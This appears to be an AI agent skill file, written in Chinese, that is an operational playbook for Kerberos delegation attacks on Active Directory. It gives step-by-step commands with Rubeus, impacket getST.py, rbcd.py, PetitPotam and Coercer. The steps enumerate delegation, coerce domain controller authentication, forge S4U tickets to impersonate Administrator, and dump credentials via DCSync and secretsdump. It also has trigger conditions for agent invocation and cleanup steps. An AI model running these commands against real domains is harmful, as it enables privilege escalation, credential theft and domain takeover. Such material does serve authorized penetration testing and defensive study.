---
name: ad-delegation-attack
description: "Kerberos 委派攻击（非约束/约束/RBCD）。当 BloodHound 发现委派配置、或已获取有 SPN 的服务账号/机器账号控制权时使用。通过 S4U 协议滥用可实现跨服务模拟任意用户，常用于域内权限提升和横向移动。"
metadata:
  tags: "kerberos,delegation,unconstrained,constrained,rbcd,s4u,s4u2self,s4u2proxy,impacket,rubeus,trustedtodelegatetoauth,msds-allowedtoactonbehalfofotheridentity"
  category: "lateral"
---

# Kerberos 委派攻击

## 触发条件

在以下场景使用本技能:
- BloodHound 发现域内存在非约束/约束委派配置
- 已控制配置了 SPN 的服务账号或机器账号
- 对目标计算机对象拥有 GenericWrite/GenericAll/WriteDacl 权限
- 需要通过委派实现权限提升或横向移动

## 前置要求

- 有效的域凭据（明文/Hash/票据）
- 已枚举委派配置（或准备枚举）
- 工具: findDelegation.py, getST.py, rbcd.py, addcomputer.py, Rubeus

## 委派类型速查

| 类型 | 关键标志/属性 | 攻击方式 |
|------|---------------|----------|
| **非约束委派** | `TRUSTED_FOR_DELEGATION` (UAC 524288) | 捕获访问者 TGT |
| **约束委派 (有协议转换)** | `msDS-AllowedToDelegateTo` + `TRUSTED_TO_AUTH_FOR_DELEGATION` | S4U2Self + S4U2Proxy |
| **约束委派 (无协议转换)** | `msDS-AllowedToDelegateTo` | 需用户先认证或结合 RBCD |
| **RBCD** | `msDS-AllowedToActOnBehalfOfOtherIdentity` | 配置后 S4U 攻击 |

---

## 决策树

```
[开始] 需要利用 Kerberos 委派
    │
    ├─ 已知委派配置？
    │   ├─ 否 → Phase 1: 委派枚举
    │   └─ 是 → 判断类型
    │
    ├─ 非约束委派 (Unconstrained)
    │   ├─ 已控制该机器？
    │   │   ├─ 是 → Phase 2: 监听 TGT + 强制认证
    │   │   └─ 否 → 需先取得机器控制权
    │   └─ 捕获 DC TGT → DCSync / 横向移动
    │
    ├─ 约束委派 (Constrained)
    │   ├─ 有协议转换 (TrustedToAuthForDelegation)?
    │   │   ├─ 是 → Phase 3: S4U2Self + S4U2Proxy 直接利用
    │   │   └─ 否 → 需用户票据或结合 RBCD
    │   ├─ 目标服务非 cifs/ldap → altservice 技巧改写 SPN
    │   └─ 获取 ST → 访问目标服务
    │
    ├─ RBCD
    │   ├─ 对目标有写权限？
    │   │   ├─ 是 → Phase 4: RBCD 攻击
    │   │   └─ 否 → 寻找 ACL 路径
    │   ├─ MAQ > 0 或已有机器账号 → 创建/使用机器账号
    │   └─ 配置 → S4U → 访问 → 清理
    │
    └─ 无委派可利用 → 检查 ACL，考虑其他路径
```

---

## Phase 1: 委派枚举

**目标**: 发现域内所有委派配置

```bash
# findDelegation.py (推荐，一次发现所有类型)
findDelegation.py <DOMAIN>/<USER>:<PASSWORD> -dc-ip <DC_IP>
```

输出示例:
```
AccountName   AccountType  DelegationType                      DelegationRightsTo
------------  -----------  ----------------------------------  --------------------------
DC01$         Computer     Unconstrained                       N/A
SVC_SQL       User         Constrained w/ Protocol Transition  MSSQLSvc/db01.domain.local
WEB01$        Computer     Constrained                         http/app01.domain.local
```

### LDAP 过滤器

```
# 非约束委派 (排除 DC)
(&(objectCategory=computer)(userAccountControl:1.2.840.113556.1.4.803:=524288)(!(primaryGroupID=516)))

# 约束委派
(&(objectCategory=*)(msDS-AllowedToDelegateTo=*))

# RBCD
(&(objectCategory=computer)(msDS-AllowedToActOnBehalfOfOtherIdentity=*))
```

### PowerView

```powershell
# 非约束委派 (排除 DC)
Get-DomainComputer -Unconstrained | Where-Object {$_.name -notlike "*DC*"}

# 约束委派
Get-DomainUser -TrustedToAuth | Select-Object samaccountname, msds-allowedtodelegateto
Get-DomainComputer -TrustedToAuth | Select-Object name, msds-allowedtodelegateto
```

### BloodHound Cypher

```
MATCH (c:Computer {unconstraineddelegation:true}) WHERE NOT c.name STARTS WITH 'DC' RETURN c.name
MATCH (u)-[:AllowedToDelegate]->(c:Computer) RETURN u.name, c.name
MATCH p=(u)-[:GenericWrite|GenericAll|WriteDacl]->(c:Computer) RETURN p
```

---

## Phase 2: 非约束委派利用

**前提**: 已控制一台非 DC 的 `TRUSTED_FOR_DELEGATION` 机器

**原理**: 用户访问时 KDC 在 ST 中嵌入 TGT，服务器缓存到 LSASS。提取即可冒充。

→ [references/unconstrained-delegation.md](references/unconstrained-delegation.md)

### 2.1 监听 TGT

```powershell
Rubeus.exe monitor /interval:10 /nowrap
Rubeus.exe monitor /interval:5 /nowrap /filteruser:DC01$
```

### 2.2 强制认证触发

```bash
# Coercer (集成多种方法)
coercer coerce -u <USER> -p <PASSWORD> -d <DOMAIN> -l <UNCONSTRAINED_MACHINE> -t <DC_IP>

# PetitPotam (MS-EFSRPC)
PetitPotam.py <UNCONSTRAINED_MACHINE> <DC_IP>

# PrinterBug (MS-RPRN)
SpoolSample.exe <DC_HOSTNAME> <UNCONSTRAINED_MACHINE>
```

### 2.3 使用捕获的 TGT

```powershell
# 导入票据并 DCSync
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /domain:<DOMAIN> /username:<USER> /password:FakePass /ticket:<BASE64_TGT>
steal_token <PID>
dcsync <DOMAIN> <DOMAIN>\krbtgt
```

```bash
# Linux
export KRB5CCNAME=dc01.ccache
secretsdump.py -k -no-pass '<DOMAIN>/DC01$@dc01.<DOMAIN>'
```

---

## Phase 3: 约束委派利用

**前提**: 控制约束委派服务账号/机器账号的凭据

→ [references/constrained-delegation.md](references/constrained-delegation.md)

### 3A: 有协议转换 — S4U2Self + S4U2Proxy

```bash
# getST.py
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>

# 使用 Hash
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -hashes :<NT_HASH> <DOMAIN>/<SERVICE_ACCOUNT>

# 使用票据
export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <TARGET_FQDN>
```

```powershell
# Rubeus
Rubeus.exe s4u /user:<SERVICE_ACCOUNT> /rc4:<NT_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### altservice 技巧

ST 中的 sname 未签名保护，可改写为同主机的其他服务:

```bash
# 原目标 time/dc01 → 改为 ldap 用于 DCSync
getST.py -spn time/<DC_FQDN> -impersonate Administrator \
  -altservice cifs/<DC_FQDN> <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
```

```powershell
Rubeus.exe s4u /impersonateuser:Administrator /msdsspn:time/<DC_FQDN> /altservice:ldap /user:<SERVICE_ACCOUNT> /ticket:<BASE64_TGT> /nowrap
```

### 3B: 无协议转换

S4U2Self 票据不可转发，需额外手段:

```bash
# 方法 1: 结合 RBCD (在服务账号自身配置)
rbcd.py -delegate-from '<SERVICE_ACCOUNT>' -delegate-to '<SERVICE_ACCOUNT>$' \
  -action write <DOMAIN>/<USER>:<PASSWORD>
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  <DOMAIN>/<SERVICE_ACCOUNT>:<PASSWORD>
```

```powershell
# 方法 2: 捕获用户可转发票据后 S4U2Proxy
Rubeus.exe monitor /interval:5 /filteruser:Administrator
Rubeus.exe s4u /ticket:<CAPTURED_TGT> /msdsspn:cifs/<TARGET_FQDN> /ptt
```

---

## Phase 4: 基于资源的约束委派 (RBCD)

**前提**: 对目标有 GenericWrite/GenericAll/WriteDacl + 可创建或已有机器账号

→ [references/rbcd-attack.md](references/rbcd-attack.md)

### 4.1 前提检查

```bash
# 检查 MAQ
crackmapexec ldap <DC_IP> -u <USER> -p <PASSWORD> -M maq
```

```powershell
# 检查 ACL
Get-DomainObjectAcl -Identity "<TARGET>" -ResolveGUIDs | Where-Object {
    $_.ActiveDirectoryRights -match "GenericWrite|GenericAll|WriteDacl"
}
```

### 4.2 创建机器账号

```bash
addcomputer.py -computer-name 'YOURPC$' -computer-pass 'P@ssw0rd123' \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

### 4.3 配置 RBCD

```bash
rbcd.py -delegate-from 'YOURPC$' -delegate-to '<TARGET>$' -action write \
  -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

### 4.4 S4U 攻击

```bash
getST.py -spn cifs/<TARGET_FQDN> -impersonate Administrator \
  -dc-ip <DC_IP> <DOMAIN>/'YOURPC$':'P@ssw0rd123'

export KRB5CCNAME=Administrator.ccache
secretsdump.py -k -no-pass <TARGET_FQDN>
```

```powershell
Rubeus.exe hash /password:P@ssw0rd123 /user:YOURPC$ /domain:<DOMAIN>
Rubeus.exe s4u /user:YOURPC$ /rc4:<COMPUTED_HASH> /impersonateuser:Administrator /msdsspn:cifs/<TARGET_FQDN> /ptt
```

### 4.5 清理

```bash
rbcd.py -delegate-to '<TARGET>$' -action flush -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
addcomputer.py -computer-name 'YOURPC$' -delete -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD>
```

```powershell
Get-DomainComputer -Identity <TARGET> | Set-DomainObject -Clear msDS-AllowedToActOnBehalfOfOtherIdentity
```

---

## 常见问题排查

### S4U 失败: KDC_ERR_BADOPTION

1. 被模拟用户在 Protected Users 组 — 换一个用户
2. 用户标记 "Account is sensitive and cannot be delegated" — 换用户
3. 服务账号 SPN 缺失 — 确认已注册
4. 无协议转换票据不可转发 — 结合 RBCD

### 无法创建机器账号

1. 检查 `ms-DS-MachineAccountQuota` (默认 10)
2. 配额耗尽 → 使用已控制的机器账号
3. 查找域内已有 SPN 的用户账号

### RBCD 配置成功但 S4U 失败

1. 确认机器账号有 SPN (`HOST/YOURPC` 自动注册)
2. `rbcd.py -action read` 验证属性写入
3. 确认 DNS 解析正确 — SPN 必须与 DNS 匹配

---

## 工具参考

| 工具 | 用途 | 平台 |
|------|------|------|
| findDelegation.py | 枚举所有委派配置 | Linux |
| getST.py | S4U 攻击获取服务票据 | Linux |
| rbcd.py | 配置/读取/清除 RBCD | Linux |
| addcomputer.py | 创建/删除机器账号 | Linux |
| Rubeus | Kerberos 票据操作 | Windows |
| Coercer | 强制认证 (集成多种方法) | Linux |
| PetitPotam | MS-EFSRPC 强制认证 | 跨平台 |

---

## 深入参考

- → [references/unconstrained-delegation.md](references/unconstrained-delegation.md) — TGT 缓存机制、强制认证触发、检测规避
- → [references/constrained-delegation.md](references/constrained-delegation.md) — S4U 协议机制、协议转换、altservice 技巧、跨域委派
- → [references/rbcd-attack.md](references/rbcd-attack.md) — RBCD 完整攻击链、替代路径、Shadow Credentials、清理与 OPSEC
